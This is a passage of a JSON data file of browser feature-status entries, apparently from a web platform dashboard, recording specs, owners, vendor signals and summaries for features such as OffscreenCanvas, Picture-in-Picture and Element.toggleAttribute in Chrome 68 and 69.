      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1469592",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 69
        },
        "owners": [
          "rakina@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>DOM"
        ],
        "desktop": 69,
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=854960",
        "intervention": false
      },
      "opera": {
        "android": 56,
        "desktop": 56
      },
      "edge": {
        "view": {
          "url": "https://github.com/whatwg/dom/issues/461#issuecomment-398206390",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Add a new method Element.toggleAttribute(string qualifiedName, optional bool force) that allow toggling the existence of an element’s attribute (or if given |force|, adjust the existence according to |force|), similar to Element.classList.toggle.\r\n\r\nThis makes managing boolean attributes much simpler as the interface doesn't use strings like setAttribute.",
    "id": 5676852374929408,
    "resources": {}
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2018-07-03 19:00:46.622560",
      "by": "fserb@google.com"
    },
    "name": "OffscreenCanvas",
    "tags": [
      "canvas",
      "Workers",
      "WebGL"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/#the-offscreencanvas-interface",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=709490",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 69
        },
        "owners": [
          "fserb@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Canvas"
        ],
        "desktop": 69,
        "flag": false,
        "android": 69,
        "bug": "http://crbug.com/563816",
        "intervention": false
      },
      "opera": {
        "android": 56,
        "desktop": 56
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "OffscreenCanvas is a new interface that allows canvas rendering contexts (2D and WebGL) to be used in Workers. Making canvas rendering contexts available to workers increases parallelism in web applications, leading to increased performance on multi-core systems.\r\n\r\nDedicatedWorker.requestAnimationFrame() allows RAF loops on Workers, allowing animation-like driven events to be triggered there as they are in Window.",
    "id": 5681560598609920,
    "resources": {
      "docs": [
        "https://wiki.whatwg.org/wiki/OffscreenCanvas",
        "https://developer.mozilla.org/en-US/docs/Web/API/OffscreenCanvas/OffscreenCanvas"
      ],
      "samples": [
        "https://ebidel.github.io/demos/offscreencanvas.html"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-06-13 15:14:56.744735",
      "by": "fbeaufort@google.com"
    },
    "name": "Picture-in-Picture (PiP)",
    "comments": "This feature requires enabling the following items in chrome://flags:\r\n  #enable-experimental-web-platform-features\r\n  #enable-surfaces-for-videos",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://wicg.github.io/picture-in-picture/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/mozilla/standards-positions/issues/72#issuecomment-393596352",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 69
        },
        "owners": [
          "fbeaufort@chromium.org",
          "mlamouri@chromium.org",
          "apacible@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Media>PictureInPicture"
        ],
        "desktop": 69,
        "flag": true,
        "bug": "http://crbug.com/806249",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://dev.windows.com/en-us/microsoft-edge/platform/status/pictureinpicture",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/WICG/picture-in-picture/search?q=jernoble&type=Issues&utf8=%E2%9C%93",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The Picture-in-Picture Web API allows websites to create a floating video window that is always on top of other windows so that users may continue consuming media while they interact with other sites or applications on their device. ",
    "id": 5729206566649856,
    "resources": {
      "docs": [
        "https://github.com/WICG/picture-in-picture/blob/master/explainer.md"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/picture-in-picture/",
        "https://github.com/beaufortfrancois/picture-in-picture-chrome-extension"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-06-12 19:21:56.621972",
      "by": "jmedley@google.com"
    },
    "name": "Remove 'stalled' events for HTMLMediaElements using MediaSourceExtensions",
    "tags": [
      "stalled",
      "MSE",
      "MediaSource",
      "HTMLMediaElement",
      "media"
    ],
    "comments": "See blink-dev thread for more details:\r\nhttps://groups.google.com/a/chromium.org/d/msg/blink-dev/x54XtrTyOP8/4-5QZlZzDAAJ\r\n\r\nMSE spec:\r\nhttps://www.w3.org/TR/media-source/\r\n\r\nInteracts with HTMLMediaElment spec:\r\nhttps://www.w3.org/TR/html52/semantics-embedded-content.html#the-media-elements\r\n\r\nDiscussion of that interaction here:\r\nhttps://github.com/w3c/media-source/issues/88#issuecomment-374406928\r\n\r\n\r\nSafari support expressed in email, so not quite \"public\", but supportive.",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1451149",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 69
        },
        "owners": [
          "chcunningham@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 69,
        "blink_components": [
          "Internals>Media>Source"
        ],
        "desktop": 69,
        "flag": false,
        "android": 69,
        "bug": "http://crbug.com/836951",
        "intervention": false
      },
      "opera": {
        "android": 56,
        "desktop": 56
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The HTMLMediaElement.stalled event fires when media download has failed to progress for at least 3 seconds. In MSE, the web app manages the download and the media element is not aware of its progress. Since some apps append media data in chunks larger than 3 seconds, stalled is now being fired at inappropriate times. As a result, stalled is being removed for MSE.   \r\n",
    "id": 6338037575319552,
    "resources": {
      "samples": [
        "https://chromium-review.googlesource.com/c/chromium/src/+/982564/17/third_party/WebKit/LayoutTests/external/wpt/media-source/mediasource-append-buffer.html"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-06-12 16:28:30.031097",
      "by": "jmedley@google.com"
    },
    "name": "Remove document.createTouchList",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/touch-events/#extensions-to-the-document-interface",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 69
        },
        "owners": [
          "eirage@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 69,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 69,
        "flag": false,
        "android": 69,
        "bug": "https://crbug.com/518868",
        "intervention": false
      },
      "opera": {
        "android": 56,
        "desktop": 56
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The document.createTouchList() method is being removed because the Touch() constructor has been supported since Chrome 48.",
    "id": 5185332291043328,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-06-21 18:14:47.941027",
      "by": "paulmeyer@google.com"
    },
    "name": "ReportingObserver. Deprecation Reports",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://wicg.github.io/reporting/#observers",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 69
        },
        "owners": [
          "paulmeyer@chromium.org",
          "rbyers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 69,
        "blink_components": [
          "Blink>JavaScript>API"
        ],
        "desktop": 69,
        "flag": false,
        "android": 69,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=731810",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Two new features of the Reporting API will give developers more insight into the functioning of their code on client machines. Deprecation reports allow deprecation warnings, currently only available developer tool consoles, to be sent to the back end. The ReportingObserver API allows JavaScript to save custom reporting data to page analytics. Both are designed to provide developers with greater insight into the operation of their web pages on real-world devices.",
    "id": 4691191559880704,
    "resources": {
      "docs": [
        "https://github.com/WICG/reporting/blob/master/EXPLAINER.md#reportingobserver---observing-reports-from-javascript",
        "https://github.com/WICG/reporting/issues/27",
        "https://github.com/WICG/reporting/issues/29"
      ]
    }
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-06-18 00:37:56.966350",
      "by": "falken@chromium.org"
    },
    "name": "ServiceWorkerRegistration#update() resolves with a registration.",
    "tags": [
      "service worker",
      "service",
      "worker",
      "update",
      "registration",
      "serviceworkerregistration"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/ServiceWorker/",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/ServiceWorker/issues/1304",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 69
        },
        "owners": [
          "worker-dev@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 69,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 69,
        "flag": false,
        "android": 69,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=836217",
        "intervention": false
      },
      "opera": {
        "android": 56,
        "desktop": 56
      },
      "edge": {
        "view": {
          "url": "https://github.com/w3c/ServiceWorker/issues/1304",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/w3c/ServiceWorker/issues/1304",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "ServiceWorkerRegistration.update() previously resolved with undefined. Now it resolves to the registration object. The spec requires  this.",
    "id": 5436747060084736,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerRegistration/update"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-06-22 14:48:43.881862",
      "by": "jmedley@google.com"
    },
    "name": "Support codec and container switching with MSE using SourceBuffer.changeType()",
    "tags": [
      "MSE",
      "changeType",
      "MediaSource",
      "codec switching",
      "bytestream switching"
    ],
    "comments": "We are incubating this feature via the WICG, with goal of eventually working with WebPlatformWG to get the result of WICG incubation as part of the next version of the Media Source Extensions API (MSE).",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://rawgit.com/wicg/media-source/codec-switching/index.html",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1456743",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 69
        },
        "owners": [
          "wolenetz@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 69,
        "blink_components": [
          "Blink>Media"
        ],
        "desktop": 69,
        "flag": true,
        "android": 69,
        "bug": "http://crbug.com/605134",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This feature adds support for improved cross-codec or cross-bytestream transitions in Chrome HTML5 Media Source Extensions playback using a new changeType() method on SourceBuffer. This new method allows the type (bytestream and codec(s)) of media bytes subsequently appended to the SourceBuffer to be changed.\r\n",
    "id": 5719220952236032,
    "resources": {
      "docs": [
        "https://github.com/wicg/media-source/blob/codec-switching/README.md",
        "https://services.w3.org/htmldiff?doc1=https%3A%2F%2Fwww.w3.org%2FTR%2Fmedia-source%2F&doc2=https%3A%2F%2Frawgit.com%2FWICG%2Fmedia-source%2Fcodec-switching%2Findex.html",
        "https://services.w3.org/htmldiff?doc1=https%3A%2F%2Frawgit.com%2FW3C%2Fmedia-source%2Fgh-pages%2Findex.html&doc2=https%3A%2F%2Frawgit.com%2FWICG%2Fmedia-source%2Fcodec-switching%2Findex.html"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-06-12 16:20:28.018556",
      "by": "jmedley@google.com"
    },
    "name": "Trusted Web Activities",
    "tags": [
      "twa",
      "pwa"
    ],
    "comments": "Trusted Web Activities are not directly a Web Platform feature, but are nevertheless relevant to web developers working on PWAs.",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 69
        },
        "owners": [
          "ellenpli@chromium.org",
          "bauerb@chromium.org",
          "peconn@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "UI>Browser>Mobile>CustomTabs(Android)"
        ],
        "flag": false,
        "android": 69,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=800418",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Trusted web activities are a mode of Chrome Custom Tabs without browser UI, available to web content an app developer controls.\r\n\r\nWe want the modern mobile web (primarily PWAs) to go mainstream. Nevertheless, they make up a small proportion of app experiences on Android today. The vast majority of developers simply haven’t made one yet. TWAs lower the risks of distribution by allowing developers to integrate their PWA into a native app and give PWA developers the same capabilities as native apps.",
    "id": 4857483210260480,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1apT3rQpTnj9kEej5iqaNaAFyOnrfD-DMJrcIui08nj0/edit#"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-06-27 14:31:33.792465",
      "by": "jmedley@google.com"
    },
    "name": "WebSocket: permit connection reuse for auth",
    "comments": "The feature can be tested by enabling the #enable-websocket-auth-connection-reuse option in about:flags.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tools.ietf.org/html/rfc4559",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 69
        },
        "owners": [
          "ricea@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Network>WebSockets"
        ],
        "desktop": 69,
        "flag": true,
        "android": 69,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=423609",
        "intervention": false
      },
      "opera": {
        "android": 56,
        "desktop": 56
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "When receiving a 401 HTTP response during the WebSocket handshake, Chrome will attempt to continue authentication on the same socket.\r\n\r\nWindows HTTP authentication usually requires a single connection to be reused in order for authentication to succeed. Until now, Chrome has always closed the connection on a 401 status response, so Windows authentication has not worked.\r\n\r\nWindows authentication support is mostly useful in enterprise environments where single-sign-on is used.",
    "id": 4885239100866560,
    "resources": {}
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2018-06-14 14:14:12.891065",
      "by": "falken@chromium.org"
    },
    "name": "performance.memory improvements",
    "tags": [
      "performance",
      "memory",
      "performance.memory"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1124223",
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 69
        },
        "owners": [
          "tdresser@chromium.org",
          "npm@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 69,
        "flag": false,
        "bug": "http://crbug.com/807651",
        "intervention": false
      },
      "opera": {
        "desktop": 56
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://docs.google.com/document/d/1fcWpKZhJdrmBlpYUB2wIx42svo9zqojoJMZg8aY7E7Y/edit#",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The performance.memory property is a non-standard API, seeing significant usage from some of our partners. With this change, if the renderer is locked to a site, remove coarse quantization and delay from values we report. This will allow developers to detect performance regressions from user data more easily because the memory measurements will be more accurate and can be taken more frequently.",
    "id": 5128919925653504,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1xVO7VMgh-6A4tezW1DJaY52jDO8vBjN81qBq4utv9uY/edit?hl=en#heading=h.l49zrjhu8egi"
      ]
    }
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-06-20 01:31:30.273894",
      "by": "falken@chromium.org"
    },
    "name": "service worker: Don't expose the API to insecure contexts.",
    "tags": [
      "serviceworker",
      "service",
      "worker",
      "insecure",
      "secure"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/ServiceWorker/",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 69
        },
        "owners": [
          "worker-dev@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 69,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 69,
        "flag": false,
        "android": 69,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=542499",
        "intervention": false
      },
      "opera": {
        "android": 56,
        "desktop": 56
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Due to a technical limitation, previously the service worker JavaScript API (navigator.serviceWorker) was exposed to insecure contexts and just threw a SecurityError when used. This change makes it so the API is not exposed to these contexts (navigator.serviceWorker is undefined). This aligns with the spec.",
    "id": 4835970390163456,
    "resources": {
      "docs": [
        "https://w3c.github.io/webappsec-secure-contexts/#secure-contexts"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-06-08 20:29:14.064113",
      "by": "jmedley@google.com"
    },
    "name": "window.confirm() will not activate parent page",
    "comments": "This shipped in Safari 9.1 and Firefox 44.",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 69
        },
        "owners": [
          "avi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WindowDialog"
        ],
        "desktop": 69,
        "flag": false,
        "bug": "https://crbug.com/849816",
        "intervention": false
      },
      "opera": {
        "desktop": 56
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "If a document in a background tab calls window.confirm() then the call to confirm() will return immediately with false, and no dialog will be shown to the user. If the tab is active, then the call will show a dialog. Specifically, this removes the ability to use window.confirm() to bring a tab to the front against the user’s will.\r\n",
    "id": 5140698722467840,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-05-01 15:51:13.096450",
      "by": "cnardi@chromium.org"
    },
    "first_of_milestone": true,
    "name": "Accept two values in the overflow shorthand",
    "tags": [
      "overflow",
      "css"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-overflow-3/#propdef-overflow",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1453148",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 68
        },
        "owners": [
          "cnardi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 68,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 68,
        "flag": false,
        "android": 68,
        "bug": "https://crbug.com/833105",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The overflow shorthand will accept two values making it possible to set overflow-x and overflow-y to different values. If two values are specified, the first is overflow-x and the second is overflow-y.\r\n\r\nThis property previously only accepted one value, meaning that a developer who wanted to set them to different values was forced to write longhand statements for both. Changing the shorthand reduces complexity by allowing developers to specify both in a single statement.\r\n",
    "id": 5090725653905408,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/overflow",
        "https://github.com/w3c/csswg-drafts/issues/2484"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-22 21:41:18.974440",
      "by": "rschoen@google.com"
    },
    "name": "Block tab-under navigations",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 68
        },
        "owners": [
          "csharrison@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "UI>Browser>TabContents"
        ],
        "desktop": 68,
        "flag": false,
        "android": 68,
        "bug": "http://crbug.com/661629",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "A tab-under is when a page both opens a popup to some destination (usually where the user wants to go) AND navigates the opener page to some third party content (usually an advertisement).\r\n\r\nChrome will block these navigations and show native UI to the user so they can follow the redirect just in case.",
    "id": 5675755719622656,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-05-24 18:17:09.547300",
      "by": "cnardi@chromium.org"
    },
    "name": "CSS position values with 3 parts",
    "comments": "https://drafts.csswg.org/css-values-3/#position",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://drafts.csswg.org/css-values-4/#typedef-position",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/csswg-drafts/issues/2140#issuecomment-358378477",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 68
        },
        "owners": [
          "ericwilligers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 68,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 68,
        "flag": false,
        "android": 68,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=804187",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "url": "https://github.com/w3c/csswg-drafts/issues/2140#issuecomment-358378477",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/w3c/csswg-drafts/issues/2140#issuecomment-358378477",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The object-position and perspective-origin properties should not accept 3 part values like \"top right 20%\". This also applies for positions in basic shapes and gradients.\r\n\r\nValid position values always have 1, 2 or 4 parts.\r\n\r\nDeprecation of 3-part values is occurred in Chrome 66, and removal occurred in Chrome 68.\r\n",
    "id": 5116559680864256,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-05-10 17:57:17.575590",
      "by": "cnardi@chromium.org"
    },
    "name": "Deprecate and Remove: negative brightness values in filter",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://drafts.fxtf.org/filter-effects/#funcdef-filter-brightness",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 68
        },
        "owners": [
          "rob.buis@samsung.org",
          "ericwilligers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 68,
        "blink_components": [
          "Blink>CSS>Filters"
        ],
        "desktop": 68,
        "flag": false,
        "android": 68,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=776208",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=184417",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "For compliance with specification, filter's brightness() function no longer accepts negative values.",
    "id": 5708036203085824,
    "resources": {}
  },
  {
    "category": "Device",
    "updated": {
      "when": "2018-05-25 16:51:53.881670",
      "by": "mattreynolds@chromium.org"
    },
    "name": "High Resolution Time Stamp for Gamepad",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://www.w3.org/TR/gamepad/#gamepad-interface",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 68
        },
        "owners": [
          "mattreynolds@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 68,
